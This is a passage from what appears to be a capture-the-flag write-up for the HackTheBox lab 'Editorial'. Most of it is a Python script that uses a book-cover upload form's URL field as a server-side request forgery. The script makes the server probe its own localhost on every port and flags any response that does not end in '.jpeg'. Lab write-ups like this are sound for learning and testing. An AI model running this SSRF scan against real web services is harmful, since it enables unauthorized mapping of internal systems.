
We are going to fuzz all ports to see if they return a specific response parameter (.jpeg in this case)

```python
 #!/usr/bin/python3
 import requests
 with open("a", 'wb') as f:
 f.write(b'')
 for port in range(1, 65535):
 with open("a", 'rb') as file:
 data_post = {"bookurl": f"http://127.0.0.1:{port}"}
 data_file = {"bookfile": file}
 try:
 r = requests.post("http://editorial.htb/upload-cover", 
files=data_file, data=data_post)
 if not r.text.strip().endswith('.jpeg'):
 print(f"{port} --- {r.text}")
 except requests.RequestException as e:
 print(f"Error on port {port}: {e}")
```